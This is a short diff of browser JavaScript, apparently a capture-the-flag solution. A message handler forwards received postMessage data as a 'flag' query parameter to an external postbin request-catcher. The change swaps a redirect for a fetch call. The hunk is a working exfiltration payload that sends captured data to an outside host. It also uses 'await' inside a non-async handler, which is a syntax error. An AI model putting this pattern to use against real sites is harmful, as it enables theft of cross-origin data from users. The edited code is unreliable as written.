@@ -7,7 +7,7 @@ window.onmessage = (e) => {
         origin,
         source
     } = e;
-    document.location="https://www.toptal.com/developers/postbin/1661892845090-2004152068402?flag=" + data;
+    await fetch("https://www.toptal.com/developers/postbin/1661892845090-2004152068402?flag=" + data);
 }
             
 document.getElementById("iframe").contentWindow.postMessage({
